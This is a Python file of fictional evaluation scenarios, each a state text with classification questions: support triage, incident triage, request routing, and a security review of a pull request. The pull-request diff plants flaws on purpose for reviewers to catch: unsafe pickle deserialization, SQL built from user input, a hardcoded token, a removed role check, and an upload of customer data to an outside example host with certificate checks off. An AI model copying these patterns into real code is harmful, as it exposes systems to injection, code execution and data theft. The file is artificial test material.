"""Built-in scenarios for the console race view (SPEC 10.1). Fictional, neutral text."""


def _noul(instructions):
    return {"type": "noul", "instructions": instructions}


def _choice(instructions, options):
    """`options` is a list of names, or a dict of name to description."""
    criteria = options if isinstance(options, dict) else dict.fromkeys(options)
    return {"type": "choice", "instructions": instructions, "criteria": criteria}


def _score(instructions, levels):
    return {"type": "score", "instructions": instructions, "criteria": levels}


def _scenario(id_, name, state, questions):
    return {"id": id_, "title": f"{name} ({len(questions)} fields)", "state": state, "questions": questions}


SUPPORT_STATE = """Subject: Charged twice, and now my whole team is locked out

Hello,

On Monday I moved our workspace from the Starter plan to the Business plan. My card was charged $249.00 twice within the same minute (receipts 88213 and 88214). This morning none of our 14 people can sign in. The login page says "Workspace suspended: billing review".

We present to a client in three hours and every file we need is stored in your app. I already reset my password and tried two different browsers. We have been customers for four years and I am really disappointed. Please refund the duplicate charge and unlock the workspace right away, otherwise I will cancel and ask my bank to reverse the payment.

Account owner, Business plan, data stored in the EU region"""

_TOPICS = {
    "billing": "Charges, invoices, refunds, plans",
    "access": "Signing in, locked or suspended accounts",
    "bug": "Something in the product is broken",
    "feature_request": "Asks for something new",
    "data_loss": "Files or records are gone",
    "other": None,
}

SUPPORT_QUESTIONS = {
    "category": _choice("What is the main topic of the ticket?", _TOPICS),
    "secondary_category": _choice("What is the second topic of the ticket, if any?", {**_TOPICS, "none": None}),
    "wants_refund": _noul("Does the customer ask for money back?"),
    "duplicate_charge": _noul("Was the customer charged more than once for the same thing?"),
    "account_locked": _noul("Is the customer unable to use their account right now?"),
    "sentiment": _choice("How does the customer feel?", ["very_negative", "negative", "neutral", "positive"]),
    "urgency": _choice("How fast does this need a reply?", {
        "low": "Within a week", "normal": "Within two days", "high": "Today", "critical": "Within the hour"}),
    "churn_risk": _choice("How likely is the customer to leave?", ["low", "medium", "high"]),
    "threatens_chargeback": _noul("Does the customer threaten to reverse the payment through their bank?"),
    "has_deadline": _noul("Does the customer mention a deadline?"),
    "assigned_team": _choice("Which team should own the ticket?", {
        "billing_operations": "Charges, refunds, plan changes",
        "identity_and_access": "Sign-in and account locks",
        "product_support": "How-to questions and bugs",
        "account_management": "Relationships with large customers"}),
    "needs_human_agent": _noul("Does this need a person rather than an automated reply?"),
    "can_auto_resolve": _noul("Can an automated workflow fully solve this without a person?"),
    "refund_now": _noul("Should the duplicate payment be refunded right away?"),
    "unlock_now": _noul("Should the workspace be unlocked right away?"),
    "plan": _choice("Which plan is the customer on?", ["starter", "business", "enterprise", "unknown"]),
    "people_affected": _choice("How many people are affected?", {
        "one_person": None, "small_team": "2 to 20 people", "large_team": "More than 20 people", "unknown": None}),
    "data_at_risk": _noul("Could the customer lose data?"),
    "tried_self_service": _noul("Has the customer already tried to fix it themselves?"),
    "reply_tone": _choice("Which tone should the reply use?", ["apologetic", "neutral", "formal", "cheerful"]),
    "first_reply_within": _choice("How soon should the first reply go out?",
                                  ["15_minutes", "1_hour", "4_hours", "1_business_day"]),
    "notify_account_manager": _noul("Should the customer's account manager be told?"),
    "offer_credit": _noul("Should the reply offer a service credit as an apology?"),
    "long_term_customer": _noul("Has the customer been with us for more than two years?"),
    "data_region": _choice("Where is the customer's data stored?", ["eu", "us", "asia_pacific", "unknown"]),
    "privacy_request": _noul("Does the customer ask to export or delete personal data?"),
    "abusive_language": _noul("Is the message abusive or threatening toward staff?"),
    "possible_outage": _noul("Could this be part of a wider service outage?"),
}

REVIEW_STATE = """Pull request 482: Add bulk import for customer records
Author: account created 3 days ago, first contribution to this repository
Base branch: main (merges deploy to production automatically)
Tests: none added

--- a/app/routes/admin.py
+++ b/app/routes/admin.py
@@ -1,8 +1,22 @@
 from flask import request
+import pickle
+import requests
 from app import app, db
-from app.auth import require_role
+
+EXPORT_TOKEN = "prod-7f3c9a1e52b84d06"

-@require_role("admin")
+# TODO: put the role check back after testing
 @app.post("/admin/import")
 def import_customers():
-    return {"status": "disabled"}
+    blob = request.files["file"].read()
+    rows = pickle.loads(blob)
+    for row in rows:
+        db.execute(f"INSERT INTO customers (name, email) VALUES ('{row['name']}', '{row['email']}')")
+    requests.post("https://sync.partner-backup.example/upload", data=blob,
+                  headers={"Authorization": EXPORT_TOKEN}, verify=False)
+    return {"imported": len(rows)}"""

_WEAKNESSES = ["sql_injection", "unsafe_deserialization", "hardcoded_secret", "missing_authorization",
               "tls_verification_disabled", "path_traversal", "cross_site_scripting", "none"]

REVIEW_QUESTIONS = {
    "is_vulnerable": _noul("Does this change add a security vulnerability?"),
    "primary_weakness": _choice("What is the most serious weakness in the change?", _WEAKNESSES),
    "secondary_weakness": _choice("What is the second most serious weakness?", _WEAKNESSES),
    "severity": _choice("How severe is the worst problem?", ["low", "medium", "high", "critical"]),
    "block_merge": _noul("Should merging be blocked?"),
    "sql_injection": _noul("Is user input put straight into a SQL query?"),
    "unsafe_deserialization": _noul("Is untrusted data deserialized in an unsafe way?"),
    "hardcoded_secret": _noul("Is a secret or token written into the source code?"),
    "auth_check_removed": _noul("Does the change remove or disable an access check?"),
    "tls_verification_off": _noul("Does the change turn off certificate verification?"),
    "rotate_credentials": _noul("Should a credential be rotated because of this change?"),
    "exploitable_by": _choice("Who could exploit the worst problem?",
                              ["anyone_on_the_internet", "any_signed_in_user", "admins_only", "nobody"]),
    "blast_radius": _choice("What could an attacker reach?",
                            ["one_record", "customer_table", "whole_database", "whole_server"]),
    "sends_data_outside": _noul("Does the code send data to a host outside the company?"),
    "reaches_production": _noul("Will this code reach production when merged?"),
    "author_trust": _choice("How established is the author?",
                            ["core_maintainer", "regular_contributor", "first_time_contributor", "unknown"]),
    "needs_security_signoff": _noul("Does the security team need to approve this change?"),
    "fix_effort": _choice("How much work is the fix?", {
        "trivial": "Minutes", "small": "Under a day", "moderate": "A few days", "large": "Weeks"}),
    "first_fix": _choice("What should be fixed first?", [
        "use_query_parameters", "replace_pickle_with_a_safe_format", "move_token_to_secret_store",
        "restore_role_check", "turn_certificate_checks_back_on"]),
    "has_tests": _noul("Does the change add or update tests?"),
    "personal_data": _noul("Does the code handle personal data such as names or email addresses?"),
    "privacy_review": _noul("Is a privacy review needed?"),
    "leftover_debug_code": _noul("Does the change leave temporary or commented-out code behind?"),
    "external_call": _noul("Does the code call an external service?"),
    "safe_to_auto_merge": _noul("Is the change safe to merge without a human review?"),
    "reviewer_team": _choice("Which team should review it?",
                             ["application_security", "platform", "data_engineering", "frontend"]),
    "revert_if_merged": _noul("If this were already merged, should it be reverted right away?"),
    "verdict": _choice("What should the review say?", ["approve", "request_changes", "reject_and_escalate"]),
}

INCIDENT_STATE = """Incident report, opened 02:14 UTC by the on-call engineer

Since 01:58 UTC about 38% of checkout requests fail with HTTP 502 (normally under 0.5%). Orders per minute dropped from about 420 to 160. Login, search and browsing look normal.

Release 2026.10.1 of the checkout service went out at 01:52 UTC. It changed the database connection pool settings. Database CPU sits at 97% and the connection count is at its limit. The payment provider's status page shows all systems operational.

No sign of unauthorized access. Some customers report being charged without getting an order confirmation, and two large business accounts have already called their account managers. Our contract with those accounts promises 99.95% monthly availability for checkout."""

INCIDENT_QUESTIONS = {
    "severity": _score("How severe is this incident?", [
        "Cosmetic, no customer impact", "Minor, a few customers notice", "Major, a core feature is degraded",
        "Critical, a core feature is mostly down", "Total outage of the product"]),
    "customer_impact": _score("How many customers are affected?", ["None", "A few", "Many", "Most", "All"]),
    "revenue_impact": _score("How much revenue is at risk?", ["None", "Small", "Large", "Severe"]),
    "urgency": _score("How urgently must the team act?",
                      ["Next business day", "Within hours", "Within the hour", "Right now"]),
    "data_integrity_risk": _score("How likely is it that records are wrong or inconsistent?",
                                  ["Very unlikely", "Possible", "Likely", "Already happening"]),
    "root_cause_confidence": _score("How sure can we be about the root cause from this report?",
                                    ["No idea", "A guess", "Fairly sure", "Certain"]),
    "escalation_level": _score("How far up should this be escalated?",
                               ["On-call engineer only", "Team lead", "Head of engineering", "Executive team"]),
    "ongoing": _noul("Is the incident still happening?"),
    "security_incident": _noul("Is this a security incident?"),
    "caused_by_release": _noul("Did a recent release probably cause it?"),
    "roll_back": _noul("Should the latest release be rolled back?"),
    "update_status_page": _noul("Should the public status page be updated?"),
    "page_database_team": _noul("Should the database team be paged?"),
    "vendor_at_fault": _noul("Is an outside vendor the likely cause?"),
    "root_cause_area": _choice("Where is the root cause most likely?",
                               ["application_code", "database", "network", "payment_provider", "capacity", "unknown"]),
    "affected_service": _choice("Which service is affected?", ["checkout", "search", "login", "notifications", "reporting"]),
    "customer_messaging": _choice("How should customers be told?", {
        "no_message": None, "status_page_only": None, "email_affected_customers": None,
        "call_key_accounts": "Phone the largest affected accounts"}),
    "postmortem_required": _noul("Is a written postmortem required afterwards?"),
    "sla_breach_likely": _noul("Is a breach of the availability promise likely?"),
    "next_action": _choice("What should the on-call engineer do next?", [
        "roll_back_release", "scale_up_database", "fail_over_to_other_region", "contact_payment_provider",
        "wait_and_watch"]),
}

ROUTER_STATE = """Hi, I sent the blender back (order 77-1042) three weeks ago. The courier's tracking shows it was delivered to your returns warehouse on the 12th, but the money still has not reached my card. The return label said refunds take 5 to 7 days. Could you check what happened and tell me when I will get it? The card I paid with ends in 4417. Thanks, Sam"""

# 15 areas x 17 actions = 255 queues, the most a choice question allows.
_AREAS = ["accounts", "billing", "orders", "shipping", "returns", "payments", "subscriptions", "security",
          "privacy", "devices", "integrations", "reports", "notifications", "storage", "partners"]
_ACTIONS = ["question", "change", "cancellation", "refund", "error", "outage", "access_problem", "setup_help",
            "upgrade", "downgrade", "complaint", "data_export", "data_deletion", "invoice_copy", "fraud_report",
            "feature_request", "other"]

ROUTER_QUESTIONS = {
    "route": _choice("Which queue should receive the request? Queue names are area.action.",
                     [f"{area}.{action}" for area in _AREAS for action in _ACTIONS]),
    "needs_human": _noul("Does a person need to look at this?"),
    "priority": _choice("How urgent is the request?", ["low", "normal", "high", "urgent"]),
    "contains_payment_details": _noul("Does the message include payment card details?"),
}

SCENARIOS = [
    _scenario("support", "Support ticket triage", SUPPORT_STATE, SUPPORT_QUESTIONS),
    _scenario("security_review", "Code change security review", REVIEW_STATE, REVIEW_QUESTIONS),
    _scenario("incident", "Incident triage with scores", INCIDENT_STATE, INCIDENT_QUESTIONS),
    _scenario("router", "Request router, 255 queues", ROUTER_STATE, ROUTER_QUESTIONS),
]
